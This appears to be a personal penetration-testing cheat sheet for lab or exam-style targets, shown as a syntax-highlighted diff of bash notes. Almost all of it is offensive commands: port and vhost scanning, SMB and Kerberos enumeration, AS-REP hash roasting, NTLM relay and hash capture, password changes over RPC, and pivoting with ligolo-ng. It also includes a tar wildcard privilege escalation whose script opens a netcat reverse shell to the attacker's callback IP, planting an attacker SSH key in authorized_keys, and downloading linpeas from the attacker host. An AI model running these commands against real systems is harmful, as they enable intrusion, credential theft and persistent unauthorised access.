+</span><span class="lnt" id="hl-0-292"><a class="lnlinks" href="#hl-0-292">292</a>
+</span><span class="lnt" id="hl-0-293"><a class="lnlinks" href="#hl-0-293">293</a>
+</span><span class="lnt" id="hl-0-294"><a class="lnlinks" href="#hl-0-294">294</a>
+</span><span class="lnt" id="hl-0-295"><a class="lnlinks" href="#hl-0-295">295</a>
+</span><span class="lnt" id="hl-0-296"><a class="lnlinks" href="#hl-0-296">296</a>
+</span><span class="lnt" id="hl-0-297"><a class="lnlinks" href="#hl-0-297">297</a>
+</span><span class="lnt" id="hl-0-298"><a class="lnlinks" href="#hl-0-298">298</a>
+</span><span class="lnt" id="hl-0-299"><a class="lnlinks" href="#hl-0-299">299</a>
+</span><span class="lnt" id="hl-0-300"><a class="lnlinks" href="#hl-0-300">300</a>
+</span><span class="lnt" id="hl-0-301"><a class="lnlinks" href="#hl-0-301">301</a>
+</span><span class="lnt" id="hl-0-302"><a class="lnlinks" href="#hl-0-302">302</a>
+</span><span class="lnt" id="hl-0-303"><a class="lnlinks" href="#hl-0-303">303</a>
+</span><span class="lnt" id="hl-0-304"><a class="lnlinks" href="#hl-0-304">304</a>
+</span><span class="lnt" id="hl-0-305"><a class="lnlinks" href="#hl-0-305">305</a>
+</span><span class="lnt" id="hl-0-306"><a class="lnlinks" href="#hl-0-306">306</a>
+</span><span class="lnt" id="hl-0-307"><a class="lnlinks" href="#hl-0-307">307</a>
+</span><span class="lnt" id="hl-0-308"><a class="lnlinks" href="#hl-0-308">308</a>
+</span><span class="lnt" id="hl-0-309"><a class="lnlinks" href="#hl-0-309">309</a>
+</span><span class="lnt" id="hl-0-310"><a class="lnlinks" href="#hl-0-310">310</a>
+</span><span class="lnt" id="hl-0-311"><a class="lnlinks" href="#hl-0-311">311</a>
+</span><span class="lnt" id="hl-0-312"><a class="lnlinks" href="#hl-0-312">312</a>
+</span><span class="lnt" id="hl-0-313"><a class="lnlinks" href="#hl-0-313">313</a>
+</span><span class="lnt" id="hl-0-314"><a class="lnlinks" href="#hl-0-314">314</a>
+</span><span class="lnt" id="hl-0-315"><a class="lnlinks" href="#hl-0-315">315</a>
+</span><span class="lnt" id="hl-0-316"><a class="lnlinks" href="#hl-0-316">316</a>
+</span><span class="lnt" id="hl-0-317"><a class="lnlinks" href="#hl-0-317">317</a>
+</span><span class="lnt" id="hl-0-318"><a class="lnlinks" href="#hl-0-318">318</a>
+</span><span class="lnt" id="hl-0-319"><a class="lnlinks" href="#hl-0-319">319</a>
+</span><span class="lnt" id="hl-0-320"><a class="lnlinks" href="#hl-0-320">320</a>
+</span><span class="lnt" id="hl-0-321"><a class="lnlinks" href="#hl-0-321">321</a>
+</span><span class="lnt" id="hl-0-322"><a class="lnlinks" href="#hl-0-322">322</a>
+</span><span class="lnt" id="hl-0-323"><a class="lnlinks" href="#hl-0-323">323</a>
+</span><span class="lnt" id="hl-0-324"><a class="lnlinks" href="#hl-0-324">324</a>
+</span><span class="lnt" id="hl-0-325"><a class="lnlinks" href="#hl-0-325">325</a>
+</span><span class="lnt" id="hl-0-326"><a class="lnlinks" href="#hl-0-326">326</a>
+</span><span class="lnt" id="hl-0-327"><a class="lnlinks" href="#hl-0-327">327</a>
+</span><span class="lnt" id="hl-0-328"><a class="lnlinks" href="#hl-0-328">328</a>
+</span><span class="lnt" id="hl-0-329"><a class="lnlinks" href="#hl-0-329">329</a>
+</span><span class="lnt" id="hl-0-330"><a class="lnlinks" href="#hl-0-330">330</a>
+</span><span class="lnt" id="hl-0-331"><a class="lnlinks" href="#hl-0-331">331</a>
+</span><span class="lnt" id="hl-0-332"><a class="lnlinks" href="#hl-0-332">332</a>
+</span><span class="lnt" id="hl-0-333"><a class="lnlinks" href="#hl-0-333">333</a>
+</span><span class="lnt" id="hl-0-334"><a class="lnlinks" href="#hl-0-334">334</a>
+</span><span class="lnt" id="hl-0-335"><a class="lnlinks" href="#hl-0-335">335</a>
+</span><span class="lnt" id="hl-0-336"><a class="lnlinks" href="#hl-0-336">336</a>
+</span><span class="lnt" id="hl-0-337"><a class="lnlinks" href="#hl-0-337">337</a>
+</span><span class="lnt" id="hl-0-338"><a class="lnlinks" href="#hl-0-338">338</a>
+</span><span class="lnt" id="hl-0-339"><a class="lnlinks" href="#hl-0-339">339</a>
+</span><span class="lnt" id="hl-0-340"><a class="lnlinks" href="#hl-0-340">340</a>
+</span><span class="lnt" id="hl-0-341"><a class="lnlinks" href="#hl-0-341">341</a>
+</span><span class="lnt" id="hl-0-342"><a class="lnlinks" href="#hl-0-342">342</a>
+</span><span class="lnt" id="hl-0-343"><a class="lnlinks" href="#hl-0-343">343</a>
+</span><span class="lnt" id="hl-0-344"><a class="lnlinks" href="#hl-0-344">344</a>
+</span><span class="lnt" id="hl-0-345"><a class="lnlinks" href="#hl-0-345">345</a>
+</span><span class="lnt" id="hl-0-346"><a class="lnlinks" href="#hl-0-346">346</a>
+</span><span class="lnt" id="hl-0-347"><a class="lnlinks" href="#hl-0-347">347</a>
+</span><span class="lnt" id="hl-0-348"><a class="lnlinks" href="#hl-0-348">348</a>
+</span><span class="lnt" id="hl-0-349"><a class="lnlinks" href="#hl-0-349">349</a>
+</span><span class="lnt" id="hl-0-350"><a class="lnlinks" href="#hl-0-350">350</a>
+</span><span class="lnt" id="hl-0-351"><a class="lnlinks" href="#hl-0-351">351</a>
+</span><span class="lnt" id="hl-0-352"><a class="lnlinks" href="#hl-0-352">352</a>
+</span><span class="lnt" id="hl-0-353"><a class="lnlinks" href="#hl-0-353">353</a>
+</span><span class="lnt" id="hl-0-354"><a class="lnlinks" href="#hl-0-354">354</a>
+</span><span class="lnt" id="hl-0-355"><a class="lnlinks" href="#hl-0-355">355</a>
+</span><span class="lnt" id="hl-0-356"><a class="lnlinks" href="#hl-0-356">356</a>
+</span><span class="lnt" id="hl-0-357"><a class="lnlinks" href="#hl-0-357">357</a>
+</span><span class="lnt" id="hl-0-358"><a class="lnlinks" href="#hl-0-358">358</a>
+</span><span class="lnt" id="hl-0-359"><a class="lnlinks" href="#hl-0-359">359</a>
+</span><span class="lnt" id="hl-0-360"><a class="lnlinks" href="#hl-0-360">360</a>
+</span><span class="lnt" id="hl-0-361"><a class="lnlinks" href="#hl-0-361">361</a>
+</span><span class="lnt" id="hl-0-362"><a class="lnlinks" href="#hl-0-362">362</a>
+</span><span class="lnt" id="hl-0-363"><a class="lnlinks" href="#hl-0-363">363</a>
+</span><span class="lnt" id="hl-0-364"><a class="lnlinks" href="#hl-0-364">364</a>
+</span><span class="lnt" id="hl-0-365"><a class="lnlinks" href="#hl-0-365">365</a>
+</span><span class="lnt" id="hl-0-366"><a class="lnlinks" href="#hl-0-366">366</a>
+</span><span class="lnt" id="hl-0-367"><a class="lnlinks" href="#hl-0-367">367</a>
+</span><span class="lnt" id="hl-0-368"><a class="lnlinks" href="#hl-0-368">368</a>
+</span><span class="lnt" id="hl-0-369"><a class="lnlinks" href="#hl-0-369">369</a>
+</span><span class="lnt" id="hl-0-370"><a class="lnlinks" href="#hl-0-370">370</a>
+</span><span class="lnt" id="hl-0-371"><a class="lnlinks" href="#hl-0-371">371</a>
+</span><span class="lnt" id="hl-0-372"><a class="lnlinks" href="#hl-0-372">372</a>
+</span><span class="lnt" id="hl-0-373"><a class="lnlinks" href="#hl-0-373">373</a>
+</span><span class="lnt" id="hl-0-374"><a class="lnlinks" href="#hl-0-374">374</a>
+</span><span class="lnt" id="hl-0-375"><a class="lnlinks" href="#hl-0-375">375</a>
+</span><span class="lnt" id="hl-0-376"><a class="lnlinks" href="#hl-0-376">376</a>
+</span><span class="lnt" id="hl-0-377"><a class="lnlinks" href="#hl-0-377">377</a>
+</span><span class="lnt" id="hl-0-378"><a class="lnlinks" href="#hl-0-378">378</a>
+</span><span class="lnt" id="hl-0-379"><a class="lnlinks" href="#hl-0-379">379</a>
+</span><span class="lnt" id="hl-0-380"><a class="lnlinks" href="#hl-0-380">380</a>
+</span><span class="lnt" id="hl-0-381"><a class="lnlinks" href="#hl-0-381">381</a>
+</span><span class="lnt" id="hl-0-382"><a class="lnlinks" href="#hl-0-382">382</a>
+</span><span class="lnt" id="hl-0-383"><a class="lnlinks" href="#hl-0-383">383</a>
+</span><span class="lnt" id="hl-0-384"><a class="lnlinks" href="#hl-0-384">384</a>
+</span><span class="lnt" id="hl-0-385"><a class="lnlinks" href="#hl-0-385">385</a>
+</span><span class="lnt" id="hl-0-386"><a class="lnlinks" href="#hl-0-386">386</a>
+</span><span class="lnt" id="hl-0-387"><a class="lnlinks" href="#hl-0-387">387</a>
+</span><span class="lnt" id="hl-0-388"><a class="lnlinks" href="#hl-0-388">388</a>
+</span><span class="lnt" id="hl-0-389"><a class="lnlinks" href="#hl-0-389">389</a>
+</span><span class="lnt" id="hl-0-390"><a class="lnlinks" href="#hl-0-390">390</a>
+</span><span class="lnt" id="hl-0-391"><a class="lnlinks" href="#hl-0-391">391</a>
+</span><span class="lnt" id="hl-0-392"><a class="lnlinks" href="#hl-0-392">392</a>
+</span><span class="lnt" id="hl-0-393"><a class="lnlinks" href="#hl-0-393">393</a>
+</span><span class="lnt" id="hl-0-394"><a class="lnlinks" href="#hl-0-394">394</a>
+</span><span class="lnt" id="hl-0-395"><a class="lnlinks" href="#hl-0-395">395</a>
+</span><span class="lnt" id="hl-0-396"><a class="lnlinks" href="#hl-0-396">396</a>
+</span><span class="lnt" id="hl-0-397"><a class="lnlinks" href="#hl-0-397">397</a>
+</span><span class="lnt" id="hl-0-398"><a class="lnlinks" href="#hl-0-398">398</a>
+</span><span class="lnt" id="hl-0-399"><a class="lnlinks" href="#hl-0-399">399</a>
+</span><span class="lnt" id="hl-0-400"><a class="lnlinks" href="#hl-0-400">400</a>
+</span><span class="lnt" id="hl-0-401"><a class="lnlinks" href="#hl-0-401">401</a>
+</span><span class="lnt" id="hl-0-402"><a class="lnlinks" href="#hl-0-402">402</a>
+</span><span class="lnt" id="hl-0-403"><a class="lnlinks" href="#hl-0-403">403</a>
+</span><span class="lnt" id="hl-0-404"><a class="lnlinks" href="#hl-0-404">404</a>
+</span><span class="lnt" id="hl-0-405"><a class="lnlinks" href="#hl-0-405">405</a>
+</span><span class="lnt" id="hl-0-406"><a class="lnlinks" href="#hl-0-406">406</a>
+</span><span class="lnt" id="hl-0-407"><a class="lnlinks" href="#hl-0-407">407</a>
+</span><span class="lnt" id="hl-0-408"><a class="lnlinks" href="#hl-0-408">408</a>
+</span><span class="lnt" id="hl-0-409"><a class="lnlinks" href="#hl-0-409">409</a>
+</span><span class="lnt" id="hl-0-410"><a class="lnlinks" href="#hl-0-410">410</a>
+</span><span class="lnt" id="hl-0-411"><a class="lnlinks" href="#hl-0-411">411</a>
+</span><span class="lnt" id="hl-0-412"><a class="lnlinks" href="#hl-0-412">412</a>
+</span><span class="lnt" id="hl-0-413"><a class="lnlinks" href="#hl-0-413">413</a>
+</span><span class="lnt" id="hl-0-414"><a class="lnlinks" href="#hl-0-414">414</a>
+</span><span class="lnt" id="hl-0-415"><a class="lnlinks" href="#hl-0-415">415</a>
+</span><span class="lnt" id="hl-0-416"><a class="lnlinks" href="#hl-0-416">416</a>
+</span><span class="lnt" id="hl-0-417"><a class="lnlinks" href="#hl-0-417">417</a>
+</span><span class="lnt" id="hl-0-418"><a class="lnlinks" href="#hl-0-418">418</a>
+</span><span class="lnt" id="hl-0-419"><a class="lnlinks" href="#hl-0-419">419</a>
+</span><span class="lnt" id="hl-0-420"><a class="lnlinks" href="#hl-0-420">420</a>
+</span><span class="lnt" id="hl-0-421"><a class="lnlinks" href="#hl-0-421">421</a>
+</span><span class="lnt" id="hl-0-422"><a class="lnlinks" href="#hl-0-422">422</a>
+</span><span class="lnt" id="hl-0-423"><a class="lnlinks" href="#hl-0-423">423</a>
+</span><span class="lnt" id="hl-0-424"><a class="lnlinks" href="#hl-0-424">424</a>
+</span><span class="lnt" id="hl-0-425"><a class="lnlinks" href="#hl-0-425">425</a>
+</span><span class="lnt" id="hl-0-426"><a class="lnlinks" href="#hl-0-426">426</a>
+</span><span class="lnt" id="hl-0-427"><a class="lnlinks" href="#hl-0-427">427</a>
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">!! RUN WINPEAS EVEN AS SYSTEM !!
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">!! USE B64 STRAIGHT FROM REVSHELL !!
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">!! INTERROGATE ALL PORTS ALWAYS !!
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">!! TEST ALL PORTS BEFORE DIVING ANY !!
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">!! ALWAYS SCAN UDP !!
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">!! READ ALL WORDS ON ERROR !!
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">!! PAY ATTENTION TO HASHCAT EXAMPLE HASHES !!
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">!! ENUMERATE PUTTY REGISTRY IF INSTALLED !!
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">!! DON<span class="s1">&#39;T TRUST BURP URLENCODE !!
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">!! GOOGLE ALL SOFTWARE + EXPLOIT !!
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">!! TRY UPPER / LOWER OF CREDS !!
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">!! IF LINPEAS == HIGHLY PROPABLE... TRY IT !!
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">!! for windows targets, if you can have it talk to you on web. TRY SMB!!
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">:%s/$cb_ip/&lt;my_ip&gt;/g
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">{{{ =-=-= Scanning =-=-=
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">sudo $(which autorecon)
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">zc | :s/$target/&lt;target&gt;/g | :norm zo``
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">sudo nmap -sC -sV -vv -p- $target -oN all_tcp_scan-$target
+</span></span></span><span class="line"><span class="cl"><span class="s1">sudo nmap -sU -vv -p 25,161,53 $target
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">{{{ =-= Web =-=
+</span></span></span><span class="line"><span class="cl"><span class="s1">!! look around, hover over links for hostnames, add to /etc/hosts !!
+</span></span></span><span class="line"><span class="cl"><span class="s1">// subdirs
+</span></span></span><span class="line"><span class="cl"><span class="s1">ffuf -w /home/kali/tools/web/default-weblist -u http://$target/FUZZ
+</span></span></span><span class="line"><span class="cl"><span class="s1">// vhosts
+</span></span></span><span class="line"><span class="cl"><span class="s1">ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H &#34;Host: FUZZ.$target&#34; -u http://$target -ac
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">## if there&#39;</span>s a .git
+</span></span><span class="line"><span class="cl">mkdir <span class="nv">$git_dir</span>
+</span></span><span class="line"><span class="cl">git-dumper <span class="nv">$target</span> <span class="nv">$git_dir</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## use gitkraken to view repo super nicely</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">}}}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">{{{</span> <span class="o">=</span>-<span class="o">=</span> <span class="nv">ftp</span> <span class="o">=</span>-<span class="o">=</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">ftp anonymous@<span class="nv">$target</span>
+</span></span><span class="line"><span class="cl">// any pass is fine <span class="k">if</span> allows anonymous
+</span></span><span class="line"><span class="cl">// <span class="k">if</span> getting weird error/no output
+</span></span><span class="line"><span class="cl">passive
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">// recursively get everything
+</span></span><span class="line"><span class="cl">wget -r ftp://<span class="nv">$user</span>:@<span class="nv">$target</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">}}}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">{{{</span> <span class="o">=</span>-<span class="o">=</span> <span class="nv">smb</span> <span class="o">=</span>-<span class="o">=</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">smbclient -N -L //<span class="nv">$target</span>
+</span></span><span class="line"><span class="cl">nxc smb <span class="nv">$target</span> -u <span class="s2">&#34;Guest&#34;</span> -p <span class="s1">&#39;&#39;</span> --shares
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">nxc smb <span class="nv">$target</span> -u <span class="s1">&#39;$user&#39;</span> -p <span class="s1">&#39;$pass&#39;</span> --users
+</span></span><span class="line"><span class="cl">nxc smb <span class="nv">$target</span> -u <span class="s1">&#39;$user&#39;</span> -p <span class="s1">&#39;$pass&#39;</span> --groups
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">impacket-smbclient <span class="o">[</span><span class="nv">$domain</span><span class="o">]</span>/<span class="nv">$user</span>:<span class="nv">$password</span>@<span class="nv">$target</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">}}}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">{{{</span> <span class="o">=</span>-<span class="o">=</span> <span class="nv">kerberos</span> <span class="o">=</span>-<span class="o">=</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">kerbrute --dc <span class="nv">$dc</span> -d <span class="nv">$domain</span> userenum /usr/share/seclists/Usernames/Names/names.txt -o users.txt
+</span></span><span class="line"><span class="cl">impacket-GetNPUsers -usersfile users.txt <span class="nv">$domain</span>/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">}}}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">{{{</span> <span class="o">=</span>-<span class="o">=</span> <span class="nv">rpc</span> <span class="o">=</span>-<span class="o">=</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">// anonymous auth
+</span></span><span class="line"><span class="cl">rpclcient -U <span class="s2">&#34;&#34;</span> -N <span class="nv">$target</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">enumdomusers
+</span></span><span class="line"><span class="cl">enumdomgroups
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">querygroup <span class="nv">$group_hex</span>
+</span></span><span class="line"><span class="cl">querygroupmem <span class="nv">$group_hex</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">queryuser <span class="nv">$user_hex</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">// try to get hashes
+</span></span><span class="line"><span class="cl"><span class="k">for</span> user in <span class="k">$(</span>cat users<span class="k">)</span><span class="p">;</span> <span class="k">do</span> impacket-GetNPUsers -no-pass -dc-ip <span class="nv">$dc</span>-ip <span class="nv">$domain</span>/<span class="si">${</span><span class="nv">user</span><span class="si">}</span> <span class="p">|</span> grep -v Impacket<span class="p">;</span> <span class="k">done</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">hashcat -m <span class="m">18200</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">!! can change creds !!
+</span></span><span class="line"><span class="cl">setuserinfo2 <span class="nv">$user</span> <span class="m">23</span> <span class="nv">$pass</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">}}}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">{{{</span> <span class="o">=</span>-<span class="o">=</span> <span class="nv">snmp</span> <span class="o">=</span>-<span class="o">=</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">snmpwalk -v2c -c public <span class="nv">$target</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">snmpwalk -v 2c -c public <span class="nv">$target</span> NET-SNMP-EXTEND-MIB::nsExtendOutputFull
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">}}}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">{{{</span> <span class="o">=</span>-<span class="o">=</span> misc <span class="nv">win</span> <span class="o">=</span>-<span class="o">=</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## following can capture hashes if you can force target to interact with your share</span>
+</span></span><span class="line"><span class="cl">impacket-smbserver -smb2support
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">// can use the following like responder, but throw the access at another box
+</span></span><span class="line"><span class="cl">impacket-ntlmrelayx -t <span class="nv">$target</span>
+</span></span><span class="line"><span class="cl">// capture hashes
+</span></span><span class="line"><span class="cl">sudo responder -i tun0
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">}}}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">}}}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">{{{</span> <span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span> Transfer / <span class="nv">Redir</span> <span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">{{{</span> <span class="o">=</span>-<span class="o">=</span> ligolo-ng <span class="o">=</span>-<span class="o">=</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> /opt/ligolo
+</span></span><span class="line"><span class="cl">sudo ./proxy -selfcert -laddr 0.0.0.0:443
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## get agent to target</span>
+</span></span><span class="line"><span class="cl">agent.exe -ignore-cert -connect <span class="nv">$cb_ip</span>:443
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">}}}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## web server with upload form/POST request friendly</span>
+</span></span><span class="line"><span class="cl">python3 -m uploadserver <span class="m">80</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## jank windows</span>
+</span></span><span class="line"><span class="cl">net user guest /active:yes
+</span></span><span class="line"><span class="cl">net share <span class="nv">$share</span><span class="o">=</span><span class="nv">$dir_to_share</span> /GRANT:Everyone,FULL
+</span></span><span class="line"><span class="cl">Icacls <span class="nv">$dir_to_share</span> /grant Everyone:F /inheritance:e /T
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">}}}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">{{{</span> <span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span> <span class="nv">Linux</span> <span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">zc <span class="p">|</span> :s/<span class="nv">$target</span>/&lt;target&gt;/g <span class="p">|</span> :norm zo<span class="sb">``</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## initial checks with command execution</span>
+</span></span><span class="line"><span class="cl">id<span class="p">;</span> uname -a
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">{{{</span> <span class="o">=</span>-<span class="o">=</span> <span class="nv">freetty</span> <span class="o">=</span>-<span class="o">=</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">python3 -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>                                                                                                                
+</span></span><span class="line"><span class="cl">// CTRL+Z
+</span></span><span class="line"><span class="cl">stty raw -echo<span class="p">;</span><span class="nb">fg</span>
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">}}}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">{{{</span> <span class="o">=</span>-<span class="o">=</span> tar <span class="nv">wildcard</span> <span class="o">=</span>-<span class="o">=</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;&#34;</span> &gt; <span class="s1">&#39;--checkpoint=1&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;&#34;</span> &gt; <span class="s1">&#39;--checkpoint-action=exec=sh privesc.sh&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;#!/bin/bash&#39;</span> &gt; privesc.sh
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;busybox nc $cb_ip 443 -e /bin/bash&#39;</span> &gt;&gt; privesc.sh
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">}}}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">sudo -l
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">!! MAKE NOTE OF ANYTHING ABNORMAL !!
+</span></span><span class="line"><span class="cl">ls -latrF .
+</span></span><span class="line"><span class="cl">ls -latrF /tmp /opt / /home
+</span></span><span class="line"><span class="cl">netstat -pantu
+</span></span><span class="line"><span class="cl">ps axjf
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">{{{</span> <span class="o">=</span>-<span class="o">=</span> <span class="nv">ssh</span> <span class="o">=</span>-<span class="o">=</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## see if current user can ssh</span>
+</span></span><span class="line"><span class="cl">cat /etc/ssh/sshd_config
+</span></span><span class="line"><span class="cl"><span class="c1">## if yes</span>
+</span></span><span class="line"><span class="cl">mkdir /home/<span class="k">$(</span>whoami<span class="k">)</span>/.ssh<span class="p">;</span> <span class="nb">echo</span> <span class="s2">&#34;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG99ilo4d7wSqJ/c6zxJsrKnvdaPcTC7GjpOFssIJrTf kali@kali&#34;</span> &gt;&gt; /home/<span class="k">$(</span>whoami<span class="k">)</span>/.ssh/authorized_keys
+</span></span><span class="line"><span class="cl">ssh -MS /tmp/s -o <span class="nv">UserKnownHostsFile</span><span class="o">=</span>/dev/null -o <span class="nv">StrictHostKeyChecking</span><span class="o">=</span>no <span class="nv">$user</span>@<span class="nv">$target</span>
+</span></span><span class="line"><span class="cl"><span class="o">}}}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## get linpeas</span>
+</span></span><span class="line"><span class="cl">scp -o <span class="nv">ControlPath</span><span class="o">=</span>/tmp/s /usr/share/peass/linpeas/linpeas.sh @:/tmp/linpeas.sh
+</span></span><span class="line"><span class="cl">wget http://<span class="nv">$cb_ip</span>/linpeas.sh
+</span></span><span class="line"><span class="cl">curl http://<span class="nv">$cb_ip</span>/linpeas.sh -O linpeas.sh
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">!! READ ALL OUTPUT !!
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## try any creds against all users</span>
+</span></span><span class="line"><span class="cl">su <span class="nv">$user</span>
